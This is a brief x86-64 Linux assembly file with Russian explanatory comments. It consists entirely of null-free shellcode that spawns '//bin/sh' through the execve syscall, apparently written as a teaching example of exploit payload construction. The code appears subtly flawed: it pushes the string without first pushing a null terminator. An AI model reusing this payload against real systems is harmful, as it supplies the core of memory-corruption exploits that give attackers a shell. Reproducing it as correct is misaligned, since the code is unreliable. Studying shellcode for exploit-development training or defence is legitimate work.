global _start

section .text

_start:
    ; 1. Очищаем регистры.
    ; XOR самого на себя дает 0, но в машинном коде нет 0x00.
    xor rdx, rdx        ; RDX = 0 (envp)
    xor rsi, rsi        ; RSI = 0 (argv)

    ; 2. Готовим строку "//bin/sh" на стеке.
    ; Мы используем 8 байт (64 бита). "/bin/sh" - это 7 байт.
    ; Добавим лишний слэш, Linux это проигнорирует: "//bin/sh" = 8 байт.
    ; В hex (little-endian): 0x68732f6e69622f2f
    
    mov rbx, 0x68732f6e69622f2f ; Кладем строку в регистр RBX
    push rbx                    ; Пушим RBX на стек
    
    ; 3. Получаем указатель на строку
    mov rdi, rsp        ; Теперь RDI указывает на "//bin/sh" на стеке

    ; 4. Устанавливаем номер системного вызова execve
    ; execve имеет номер 59.
    ; Если сделать mov rax, 59 -> это сгенерирует нули в старших байтах.
    ; Поэтому используем al (младший байт).
    xor rax, rax        ; Обнуляем RAX
    mov al, 59          ; Записываем 59 в младший байт

    ; 5. Вызов ядра
    syscall